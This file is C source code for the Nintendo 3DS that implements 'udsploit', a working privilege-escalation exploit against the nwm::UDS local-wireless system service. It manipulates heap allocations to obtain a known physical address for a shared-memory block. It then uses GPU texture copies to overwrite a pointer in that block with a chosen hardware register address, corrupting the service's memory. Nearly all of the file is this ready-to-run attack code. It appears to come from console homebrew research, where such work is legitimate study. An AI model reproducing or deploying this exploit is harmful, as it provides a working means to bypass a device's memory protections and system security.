#include <string.h>
#include <stdio.h>
#include <malloc.h>
#include <3ds.h>

// TEMP, so that we can still allocate memory; this is only needed to run in a 3dsx obviously
extern char* fake_heap_start;
extern char* fake_heap_end;
extern u32 __ctru_heap, __ctru_heap_size, __ctru_linear_heap, __ctru_linear_heap_size;

void __attribute__((weak)) __system_allocateHeaps() {
	u32 tmp = 0;

	__ctru_heap_size = 8 * 1024 * 1024;

	// Allocate the application heap
	__ctru_heap = 0x08000000;
	svcControlMemory(&tmp, __ctru_heap, 0x0, __ctru_heap_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);

	// Allocate the linear heap
	svcControlMemory(&__ctru_linear_heap, 0x0, 0x0, __ctru_linear_heap_size, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

	// Set up newlib heap
	fake_heap_start = (char*)__ctru_heap;
	fake_heap_end = fake_heap_start + __ctru_heap_size;

}

static Result UDS_InitializeWithVersion(Handle* handle, udsNodeInfo *nodeinfo, Handle sharedmem_handle, u32 sharedmem_size) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x001B0302;
	cmdbuf[1] = sharedmem_size;
	memcpy(&cmdbuf[2], nodeinfo, sizeof(udsNodeInfo));
	cmdbuf[12] = 0x400;//version
	cmdbuf[13] = 0;
	cmdbuf[14] = sharedmem_handle;

	Result ret = 0;
	if ((ret = svcSendSyncRequest(*handle))) { return ret; }
	ret = cmdbuf[1];

	return ret;
}

static Result UDS_Bind(Handle* handle, u32 BindNodeID, u32 input0, u8 data_channel, u16 NetworkNodeID) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x120100;
	cmdbuf[1] = BindNodeID;
	cmdbuf[2] = input0;
	cmdbuf[3] = data_channel;
	cmdbuf[4] = NetworkNodeID;

	Result ret = 0;
	if ((ret = svcSendSyncRequest(*handle))) { return ret; }
	ret = cmdbuf[1];

	return ret;
}

static Result UDS_Unbind(Handle* handle, u32 BindNodeID) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x130040;
	cmdbuf[1] = BindNodeID;

	Result ret = 0;
	if ((ret = svcSendSyncRequest(*handle))) { return ret; }

	return cmdbuf[1];
}

static Result UDS_Shutdown(Handle* handle) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x30000;

	Result ret = 0;
	if ((ret = svcSendSyncRequest(*handle))) { return ret; }

	return cmdbuf[1];
}

static Result NDM_EnterExclusiveState(Handle* handle, u32 state) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x10042;
	cmdbuf[1] = state;
	cmdbuf[2] = 0x20;

	Result ret = 0;
	if ((ret = svcSendSyncRequest(*handle))) { return ret; }

	return cmdbuf[1];
}

static Result NDM_LeaveExclusiveState(Handle* handle) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x20002;
	cmdbuf[1] = 0x20;

	Result ret = 0;
	if ((ret = svcSendSyncRequest(*handle))) { return ret; }

	return cmdbuf[1];
}

// la == linear address (output)
static Result allocHeapWithLa(u32 va, u32 size, u32* la) {
	Result ret = 0;
	u32 placeholder_addr = __ctru_heap + __ctru_heap_size;
	u32 placeholder_size = 0;
	u32 linear_addr = 0;

	printf("allocate linear buffer as big as target buffer\n");
	if ((ret = svcControlMemory((u32*)&linear_addr, 0, 0, size, 0x10003, 0x3))) { return ret; }

	printf("figure out how much memory is available\n");
	s64 tmp = 0;
	if ((ret = svcGetSystemInfo(&tmp, 0, 1))) { return ret; }

	placeholder_size = *((u32*)(0x1FF80040)) - (u32)tmp; // APPMEMALLOC
	printf("%08X\n", (unsigned int)placeholder_size);

	printf("allocate placeholder to cover all free memory\n");
	if ((ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 3, 3))) { return ret; }

	printf("free linear block\n");
	if ((ret = svcControlMemory((u32*)&linear_addr, (u32)linear_addr, 0, size, 1, 0))) { return ret; }

	printf("allocate regular heap to replace it: we know its PA\n");
	if ((ret = svcControlMemory((u32*)&va, (u32)va, 0, size, 3, 3))) { return ret; }

	printf("free placeholder memory\n");
	if ((ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 1, 0))) { return ret; }

	if (la) { *la = linear_addr; }

	return 0;
}

Result udsploit() {
	Handle udsHandle = 0;
	Handle ndmHandle = 0;
	Result ret = 0;

	const u32 sharedmem_size = 0x1000;
	Handle sharedmem_handle = 0;
	u32 sharedmem_va = 0x0dead000, sharedmem_la = 0;

	printf("udsploit: srvGetServiceHandle\n");
	if ((ret = srvGetServiceHandle(&udsHandle, "nwm::UDS"))) { goto fail; }

	printf("udsploit: srvGetServiceHandle\n");
	if ((ret = srvGetServiceHandle(&ndmHandle, "ndm:u"))) { goto fail; }

	printf("udsploit: allocHeapWithPa\n");
	if ((ret = allocHeapWithLa(sharedmem_va, sharedmem_size, &sharedmem_la))) {
		sharedmem_va = 0;
		goto fail;
	}
	printf("udsploit: sharedmem_la %08X\n", (unsigned int)sharedmem_la);

	printf("udsploit: svcCreateMemoryBlock\n");
	memset((void*)sharedmem_va, 0, sharedmem_size);
	if ((ret = svcCreateMemoryBlock(&sharedmem_handle, (u32)sharedmem_va, sharedmem_size, 0x0, MEMPERM_READ | MEMPERM_WRITE))) { goto fail; }

	printf("udsploit: NDM_EnterExclusiveState\n");
	if ((ret = NDM_EnterExclusiveState(&ndmHandle, 2))) { goto fail; } // EXCLUSIVE_STATE_LOCAL_COMMUNICATIONS

	printf("udsploit: UDS_InitializeWithVersion\n");
	udsNodeInfo nodeinfo = { 0 };
	if ((ret = UDS_InitializeWithVersion(&udsHandle, &nodeinfo, sharedmem_handle, sharedmem_size))) { goto fail; }

	printf("udsploit: NDM_LeaveExclusiveState\n");
	if ((ret = NDM_LeaveExclusiveState(&ndmHandle))) { goto fail; }

	printf("udsploit: UDS_Bind\n");
	u32 BindNodeID = 1;
	if ((ret = UDS_Bind(&udsHandle, BindNodeID, 0xff0, 1, 0))) { goto fail; }

	{
		unsigned int* buffer = linearAlloc(sharedmem_size);

		GSPGPU_InvalidateDataCache(buffer, sharedmem_size);

		svcSleepThread(1 * 1000 * 1000);
		GX_TextureCopy((void*)sharedmem_la, 0, (void*)buffer, 0, sharedmem_size, 8);
		svcSleepThread(1 * 1000 * 1000);

		for (int i = 0; i < 8; i++) {
			printf("%08X %08X %08X %08X\n", buffer[i * 4 + 0], buffer[i * 4 + 1], buffer[i * 4 + 2], buffer[i * 4 + 3]);
		}

		buffer[3] = 0x1EC40140 - 8;

		GSPGPU_FlushDataCache(buffer, sharedmem_size);
		GX_TextureCopy((void*)buffer, 0, (void*)sharedmem_la, 0, sharedmem_size, 8);
		svcSleepThread(1 * 1000 * 1000);

		linearFree(buffer);
	}

	printf("udsploit: UDS_Unbind\n");
	if ((ret = UDS_Unbind(&udsHandle, BindNodeID))) { goto fail; /* it's just a formality... */ }

fail:
	if (udsHandle) { UDS_Shutdown(&udsHandle); }
	if (ndmHandle) { svcCloseHandle(ndmHandle); }
	if (udsHandle) { svcCloseHandle(udsHandle); }
	if (sharedmem_handle) { svcCloseHandle(sharedmem_handle); }
	if (sharedmem_va) { svcControlMemory((u32*)&sharedmem_va, (u32)sharedmem_va, 0, sharedmem_size, 0x1, 0); }
	return ret;
}